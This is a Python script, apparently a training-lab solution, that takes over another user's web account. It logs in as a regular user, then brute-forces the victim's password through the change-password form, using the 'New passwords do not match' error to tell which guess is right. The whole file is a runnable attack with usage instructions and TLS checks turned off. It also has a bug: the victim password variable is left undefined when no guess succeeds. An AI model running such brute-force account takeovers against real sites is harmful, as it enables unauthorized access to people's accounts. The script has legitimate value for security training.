import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def access_victim_account(s, url, username):
    print("(+)Logging into regular user's account..........")
    login_url = url + '/login'
    regular_login_data = {'username': 'wiener', 'password': 'peter'}
    r = s.post(login_url, data=regular_login_data, verify=False)
    if r.status_code == 200:
        print("(+)Logged in successfully to regular user's account..........")
        print("(+) Brute-forcing victim account....")
        change_password_url = url + '/my-account/change-password'
        with open('password.txt', 'r') as f:
            for pwd in f.readlines():
                pwd = pwd.strip('\n')
                change_password_data = {'username': username,
                                        'current-password': pwd,
                                        'new-password-1': 'hello',
                                        'new-password-2': 'hello2'}

                r = s.post(change_password_url, data=change_password_data, verify=False)
                if 'New passwords do not match' in r.text:
                    print("(+) Found victim's password: " + pwd)
                    victim_pass = pwd
                    break

            if victim_pass:
                # Login
                login_data = {'username': username, 'password': victim_pass}
                r = s.post(login_url, data=login_data, verify=False)
                if 'Log out' in r.text:
                    print("(+) Logged in successfully")
                else:
                    print("(+) Login failed")
            else:
                print("(-) Victim account was not found. Please try again.")
                sys.exit(1)
    else:
        print("(+)Failed to log in to regular user's account..........")


def main():
    if len(sys.argv) != 3:
        print("Usage: %s <url> <username> " % sys.argv[0])
        print("Example: %s www.example.com carlos" % sys.argv[0])
        sys.exit(1)
    s = requests.Session()
    url = sys.argv[1]
    victim_username = sys.argv[2]
    access_victim_account(s, url, victim_username)


if __name__ == '__main__':
    main()
